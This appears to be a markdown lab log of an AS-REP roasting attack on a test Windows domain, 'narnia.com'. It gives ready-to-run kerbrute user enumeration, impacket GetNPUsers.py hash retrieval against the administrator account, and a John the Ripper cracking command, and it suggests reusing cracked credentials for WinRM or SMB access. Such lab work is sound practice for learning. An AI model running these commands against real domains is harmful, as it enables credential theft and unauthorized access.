
markdown
Copy
Edit
# 🔐 AS-REP Roasting & Kerberos Enumeration (2025-04-24)

**Target:** 192.168.1.2 (Windows Server 2025 - `narnia.com`)  
**Attacker Machine:** Kali Linux (`192.168.1.10`)  
**Tools Used:** `kerbrute`, `impacket` (GetNPUsers.py)

---

## 🎯 Goal

- Identify valid domain usernames
- Test for Kerberos accounts with "Do not require pre-authentication"
- Retrieve AS-REP hashes for offline cracking

---

## 🧰 Step 1: Kerbrute Enumeration

**Command:**
```bash
kerbrute userenum --dc 192.168.1.2 -d narnia.com usernames.txt
Result:

pgsql
Copy
Edit
[*] Valid user found: administrator@narnia.com
[*] Valid user found: jdoe@narnia.com
✅ 2 valid usernames identified

🧰 Step 2: AS-REP Roasting with Impacket
Command:

bash
Copy
Edit
cd ~/impacket/examples
python3 GetNPUsers.py -dc-ip 192.168.1.2 narnia.com/ -usersfile usernames.txt -no-pass
Result:

plaintext
Copy
Edit
[*] Found user administrator with no pre-auth required
$krb5asrep$23$administrator@NARNIA.COM:...
...
✅ AS-REP hash retrieved
🛠️ Next step: crack it with John the Ripper

🔓 Step 3: Cracking Hash
Command:

bash
Copy
Edit
john --wordlist=/usr/share/wordlists/rockyou.txt hashfile
(Pending...)

🗂️ Notes
Only users with no-preauth will show AS-REP hashes

AS-REP hashes are Type 23 and can be cracked offline

If cracked, use credentials for WinRM or SMB access

✅ Summary

Stage	Status
Valid users found	✅ (2)
AS-REP hash found	✅ (administrator)
Hash cracked	🔄 Pending
